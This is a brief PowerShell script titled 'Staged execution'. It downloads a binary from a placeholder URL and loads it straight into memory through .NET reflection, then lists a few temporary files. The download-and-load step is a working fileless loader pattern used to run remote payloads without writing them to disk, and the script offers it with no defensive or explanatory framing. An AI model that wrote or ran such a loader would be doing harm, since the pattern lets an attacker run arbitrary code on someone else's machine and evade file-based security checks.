
<# Staged execution #>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://example.org/payload.bin"
)
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($FetchUrl)
[Reflection.Assembly]::Load($AssemblyBytes)
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
